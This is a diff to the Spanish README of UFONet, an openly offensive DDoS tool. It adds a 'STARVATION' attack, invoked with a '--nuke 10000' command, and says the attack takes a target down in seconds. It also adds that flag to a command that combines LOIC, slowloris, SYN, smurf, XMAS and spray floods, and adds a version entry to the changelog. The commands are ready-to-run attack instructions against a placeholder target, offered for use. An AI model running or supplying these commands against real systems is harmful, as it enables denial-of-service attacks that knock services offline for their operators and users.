@@ -364,11 +364,15 @@ O un ataque XMAS ('root' requerido) que inundará tu objetivo con paquetes 'Árb
 
      sudo python ufonet -a http://target.com --xmas 101
 
+Un ataque STARVATION ('root' requerido) que tumbará tu objetivo en segundos, si éste no tiene un mínimo nivel de protección:
+
+     sudo python ufonet -a http://target.com --nuke 10000
+
 Todos los ataques pueden ser combinados haciendo que UFONet utilice distintas técnicas de DDoS y DoS, al mismo tiempo:
 
      python ufonet -a http://target.com --loic 100 --loris 100
 
-     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101
+     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101 --nuke 10000
 
 ###############################
 # Actualizando
@@ -432,6 +436,10 @@ más algunas "extra":
 ###############################
 # Timelog
 ###############################
+
+--------------------------
+03.02.2019 : v.1.2.1
+--------------------------
 
 --------------------------
 31.12.2018 : v.1.2
